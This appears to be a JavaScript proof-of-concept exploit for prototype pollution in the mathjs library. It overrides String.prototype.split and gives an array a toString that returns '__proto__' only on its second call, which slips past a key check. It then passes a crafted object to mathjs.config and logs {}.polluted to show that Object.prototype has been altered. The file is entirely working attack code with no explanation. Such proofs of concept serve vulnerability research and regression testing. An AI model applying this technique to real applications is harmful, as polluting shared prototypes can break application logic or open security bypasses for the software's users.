var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var mathMod = require('mathjs');
const mathjs = mathMod.create(mathMod.all);
console.log({}.polluted);
const newConfig = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
mathjs.config(newConfig);
console.log({}.polluted);